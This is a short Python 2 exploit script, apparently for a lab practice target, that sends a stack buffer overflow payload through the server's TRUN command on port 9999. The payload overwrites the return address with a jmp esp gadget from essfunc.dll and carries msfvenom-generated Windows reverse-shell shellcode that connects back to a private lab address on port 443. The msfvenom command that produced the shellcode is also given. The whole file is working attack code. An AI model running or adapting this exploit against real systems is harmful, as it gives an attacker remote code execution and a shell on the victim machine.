#!/usr/bin/env python

import socket
import os
import sys
from subprocess import Popen,PIPE
import struct

def p32(addr):
	return struct.pack("<I",addr)


def line_send_tcp(host,port,payload_list = [],recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,int(port)))
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 -f c EXITFUNC=thread -b "\x00\x0a\x0d"
# [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
shellcode = (
"\x31\xc0\x31\xed\x31\xf6"  # zero out eax,ebp,esi
"\xbe\xf8\xeb\x24\xd1\xdd\xc3\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x4f\x31\x75\x14\x03\x75\x14\x83\xc5\x04\x1a\x1e\xd8\x39\x53"
"\xe1\x21\xba\x03\x6b\xc4\x8b\x11\x0f\x8c\xbe\xa5\x5b\xc0\x32"
"\x4e\x09\xf1\xc1\x22\x86\xf6\x62\x88\xf0\x39\x72\x3d\x3d\x95"
"\xb0\x5c\xc1\xe4\xe4\xbe\xf8\x26\xf9\xbf\x3d\x5a\xf2\xed\x96"
"\x10\xa1\x01\x92\x65\x7a\x20\x74\xe2\xc2\x5a\xf1\x35\xb6\xd0"
"\xf8\x65\x67\x6f\xb2\x9d\x03\x37\x63\x9f\xc0\x24\x5f\xd6\x6d"
"\x9e\x2b\xe9\xa7\xef\xd4\xdb\x87\xa3\xea\xd3\x05\xba\x2b\xd3"
"\xf5\xc9\x47\x27\x8b\xc9\x93\x55\x57\x5c\x06\xfd\x1c\xc6\xe2"
"\xff\xf1\x90\x61\xf3\xbe\xd7\x2e\x10\x40\x34\x45\x2c\xc9\xbb"
"\x8a\xa4\x89\x9f\x0e\xec\x4a\xbe\x17\x48\x3c\xbf\x48\x34\xe1"
"\x65\x02\xd7\xf6\x1f\x49\xb0\x3b\x2d\x72\x40\x54\x26\x01\x72"
"\xfb\x9c\x8d\x3e\x74\x3a\x49\x40\xaf\xfa\xc5\xbf\x50\xfa\xcc"
"\x7b\x04\xaa\x66\xad\x25\x21\x77\x52\xf0\xe5\x27\xfc\xab\x45"
"\x98\xbc\x1b\x2d\xf2\x32\x43\x4d\xfd\x98\xf2\x4a\x6a\xe3\xad"
"\xac\xe8\x8b\xaf\x4c\xee\xf0\x39\xaa\x9a\x16\x6c\x65\x33\x8e"
"\x35\xfd\xa2\x4f\xe0\x95\x47\xdd\x6f\x65\x01\xfe\x27\x32\x46"
"\x30\x3e\xd6\x7a\x6b\xe8\xc4\x86\xed\xd3\x4c\x5d\xce\xda\x4d"
"\x10\x6a\xf9\x5d\xec\x73\x45\x09\xa0\x25\x13\xe7\x06\x9c\xd5"
"\x51\xd1\x73\xbc\x35\xa4\xbf\x7f\x43\xa9\x95\x09\xab\x18\x40"
"\x4c\xd4\x95\x04\x58\xad\xcb\xb4\xa7\x64\x48\xd4\x45\xac\xa5"
"\x7d\xd0\x25\x04\xe0\xe3\x90\x4b\x1d\x60\x10\x34\xda\x78\x51"
"\x31\xa6\x3e\x8a\x4b\xb7\xaa\xac\xf8\xb8\xfe"
)

#2989

jmp_esp = p32(0x62501203) # essfunc.dll

payload = [
			# "GDOG %s\n" %(shellcode),
			"TRUN /.../%s\n" %('A'*2002+p32(0x62501203)+shellcode+'\x90'*(983-len(shellcode)))
		]

host = "192.168.248.130"
port = 9999

line_send_tcp(host,port,payload_list=payload,recv_first=True)